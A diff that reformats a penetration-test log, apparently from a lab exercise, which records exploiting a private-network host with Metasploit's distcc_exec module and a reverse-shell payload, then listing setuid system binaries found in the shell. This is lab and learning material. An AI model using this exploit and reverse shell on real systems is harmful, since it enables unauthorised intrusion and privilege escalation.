@@ -1,33 +1,41 @@
-Target IP: 192.168.1.59
-Exploit Used: unix/misc/distcc_exec
-Payload: cmd/unix/reverse
-Commands Executed in Shell:
-    /lib/dhcp3-client/call-dhclient-script
-    /usr/bin/sudoedit
-    /usr/bin/X
-    /usr/bin/netkit-rsh
-    /usr/bin/gpasswd
-    /usr/bin/traceroute6.iputils
-    /usr/bin/sudo
-    /usr/bin/netkit-rlogin
-    /usr/bin/arping
-    /usr/bin/at
-    /usr/bin/newgrp
-    /usr/bin/chfn
-    /usr/bin/nmap
-    /usr/bin/chsh
-    /usr/bin/netkit-rcp
-    /usr/bin/passwd
-    /usr/bin/mtr
-    /usr/sbin/uuidd
-    /usr/sbin/pppd
-    /usr/lib/telnetlogin
-    /usr/lib/apache2/suexec
-    /usr/lib/eject/dmcrypt-get-device
-    /usr/lib/openssh/ssh-keysign
-    /usr/lib/pt_chown
+# Phase 2 - distcc_exec Exploit
 
+**Target IP:** `192.168.1.59`  
+**Exploit Used:** `unix/misc/distcc_exec`  
+**Payload:** `cmd/unix/reverse`
+
+---
+
+## Commands Executed in Shell
+```bash
+/lib/dhcp3-client/call-dhclient-script
+/usr/bin/sudoedit
+/usr/bin/X
+/usr/bin/netkit-rsh
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/netkit-rlogin
+/usr/bin/arping
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/nmap
+/usr/bin/chsh
+/usr/bin/netkit-rcp
+/usr/bin/passwd
+/usr/bin/mtr
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/usr/lib/telnetlogin
+/usr/lib/apache2/suexec
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+
+------------------------------------------------------------
 Session Outcome:
-    - Successfully connected to target
-    - Verified access to multiple system binaries
-    - Manually exited session
+- ✅ Successfully connected to target (192.168.1.59)
+- ✅ Verified access to multiple system binaries
+- ✅ Manually exited session after validation
+------------------------------------------------------------
